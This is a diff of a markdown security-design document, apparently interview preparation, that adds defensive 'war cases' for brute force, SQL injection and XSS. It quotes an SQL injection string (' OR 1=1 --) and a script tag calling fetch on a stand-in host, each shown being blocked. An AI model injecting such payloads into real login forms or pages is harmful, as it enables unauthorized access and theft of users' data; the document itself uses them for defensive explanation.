@@ -17,10 +17,27 @@ We avoid `LocalStorage` for JWT storage.
 1. **Strict Content Security Policy (CSP)**: Disables `unsafe-eval` and restricts script execution to trusted domains. This stops "Malicious Code Injection."
 2. **Restrictive CORS**: The API only accepts requests from an explicit allow-list (e.g., `https://nexgen.com`). This stops "Cross-Origin Data Scraping."
 
-## 4. Proprietary Code Obfuscation
+## 4. Security War Cases (Failover & Defense)
+
+### Case 1: The "Brute Force" Scenario
+**Situation**: An attacker attempts to guess a user password by making 10,000 requests.
+- **Defense**: The Redis-backed rate limiter detects the IP spike.
+- **Outcome**: The worker stops processing the request at the middleware layer and returns a `429 Too Many Requests`. The password-hashing CPU load (Bcrypt) never even triggers.
+
+### Case 2: The "SQL Injection" Attempt
+**Situation**: A malicious user sends `' OR 1=1 --` in the login field.
+- **Defense**: We use **Parameterized Queries** via the ORM/Query Builder.
+- **Outcome**: The input is treated as a literal string, not code. The database simply returns "User not found."
+
+### Case 3: The "XSS / Script Injection" War Case
+**Situation**: A user tries to upload their name as `<script>fetch('malicious.com')</script>`.
+- **Defense**: Content Security Policy (CSP) blocks all inline scripts and unauthorized domains.
+- **Outcome**: The browser identifies the script as a policy violation and refuses to execute it, keeping other users' cookies safe.
+
+## 5. Proprietary Code Obfuscation
 Insurance companies often want to protect their calculation logic (the "Mathematical Engine").
-- **Implementation**: We use **Javascript-Obfuscator** during the Docker build stage.
-- **Effect**: It transforms the clear, human-readable source code into an unreadable, non-tracable machine-string array. This protects intellectual property from reverse engineering.
+- **Implementation**: We use **Javascript-Obfuscator** during the build stage.
+- **Effect**: It transforms the clear, human-readable source code into an unreadable string array, protecting intellectual property from reverse engineering.
 
 ## 5. Interview Talking Points:
 - **"How do you stop XSS attacks?"**: We use HttpOnly cookies for session storage and a strict CSP to block untrusted script execution.
